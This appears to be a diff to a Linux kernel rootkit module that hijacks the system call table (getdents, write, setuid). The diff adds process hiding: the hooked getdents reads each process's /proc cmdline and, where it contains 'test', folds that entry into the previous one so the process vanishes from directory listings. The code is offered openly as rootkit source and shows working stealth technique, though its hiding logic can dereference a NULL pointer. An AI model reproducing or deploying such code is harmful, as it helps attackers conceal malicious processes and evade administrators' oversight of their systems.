@@ -14,6 +14,8 @@
 #include <linux/ctype.h>
 #include <linux/dcache.h>
 #include <linux/file.h>
+//processes directory
+#include <linux/proc_fs.h>
 
 
 struct linux_dirent {
@@ -37,6 +39,8 @@ asmlinkage int (*real_getdents) (unsigned int, struct linux_dirent*, unsigned in
 
 asmlinkage long (*real_read)(unsigned int, char __user *, size_t);
 asmlinkage long (*real_write)(unsigned int, char __user *, size_t);
+
+
 asmlinkage long hijacked_write(unsigned int fd, char __user *buf, size_t count) 
 {
 	char *kbuf = NULL, *path = NULL,*str = NULL;
@@ -142,21 +146,101 @@ asmlinkage int hijacked_setuid(uid_t uid){
 		return real_setuid(uid);
 }
 
+int isnumber(char *num){
+	int i;
+	int b = 1;
+	int numlen = strlen(num);
+	for(i = 0; i < numlen; i++){
+		if(!isdigit(num[i])){
+			b = 0;
+			break;
+		}
+	}
+	return b;
+}
+
 asmlinkage int hijacked_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count){
 	
-	int i;
-	struct linux_dirent *cdirp;
+	char kbuf[128];
+	char kbuf2[128]; 
+	char *path;
+	mm_segment_t fs;
+	int i, readnums, size, k;
+	struct linux_dirent *cdirp, *pdirp = NULL;
+	struct file *f = fget(fd), *fcmdline;
 	long start_offset = (long)dirp;
 	int num_reads = real_getdents(fd, dirp, count);
+
+	bool isproc = false;
+
 	cdirp = dirp;
 	printk(KERN_INFO "hijacked call.\n");
 	printk(KERN_INFO "num reads: %d\n",num_reads);
 
+	
+
 	for (i = 0; i < num_reads; i+= cdirp->d_reclen){
 		cdirp = (struct linux_dirent*)(start_offset + i);
+		
+		if (isnumber(cdirp->d_name)){
+			for (k = 0; k<128; k++){
+				kbuf[k] = 0;
+				kbuf2[k] = 0;
+			}
+			//initialize kbuf2 to the process cmdline folder /proc/<PID>/cmdline
+			kbuf2[0] = '/';
+			kbuf2[1] = 'p';
+			kbuf2[2] = 'r';
+			kbuf2[3] = 'o';
+			kbuf2[4] = 'c';
+			kbuf2[5] = '/';
+			size = strlen(cdirp->d_name);
+			for (k = 0; k < size; k++){
+				kbuf2[k+6] = (cdirp->d_name)[k];
+			}
+			kbuf2[size+6] = '/';
+			kbuf2[size+7] = 'c';
+			kbuf2[size+8] = 'm';
+			kbuf2[size+9] = 'd';
+			kbuf2[size+10] = 'l';
+			kbuf2[size+11] = 'i';
+			kbuf2[size+12] = 'n';
+			kbuf2[size+13] = 'e';
+			//open
+			fcmdline = filp_open(kbuf2, O_RDONLY,0);
+			
+			if (fcmdline == NULL) printk(KERN_ALERT "filp_open error.\n");
+			else {
+				//get current segment descriptor
+				fs = get_fs();
+				//set segment descriptor associated to kernel space
+				set_fs(get_ds());
+				//read file
+				fcmdline->f_op->read(fcmdline, kbuf, 128, &fcmdline->f_pos);
+				//restore segment descriptor
+				set_fs(fs);
+				//check process for "test"
+				printk(KERN_INFO "kbuf: %s\n",kbuf);
+				if(strstr(kbuf, "test")!=NULL){
+					printk("File to hide %s\n", kbuf2);
+					pdirp->d_reclen += cdirp->d_reclen;
+				}
+
+			}
+			filp_close(fcmdline, NULL);
+
+		}
+		/*set previous dirp to current dirp (to be used next iteration of loop)*/
+		pdirp = cdirp;
+
 		printk(KERN_INFO "d_ino:%lu, d_reclen:%u, d_off:%lu, d_name: %s \n",
 		       cdirp->d_ino, cdirp->d_reclen, cdirp->d_off, cdirp->d_name);
+
 	}
+	
+
+			
+
 	return num_reads;
 }
 
@@ -195,6 +279,8 @@ void hijack_sys_call_table(void){
 	make_ro((unsigned long)sys_call_table);
 }
 
+
+
 int init_module(void){
 	
 	/*
@@ -202,11 +288,14 @@ int init_module(void){
 	taken from the /boot/System map file. This address seems to be the same
 	after every boot, so for now it can be hardcoded.
 	*/
-	sys_call_table = (unsigned long*)0xc15c3060;
+	sys_call_table = (unsigned long*)0xc1688140;
 	hijack_sys_call_table();	
 	
+
+
 	printk(KERN_INFO "Rootkit added.\n\n");
-	
+
+
 	return 0;
 }
 
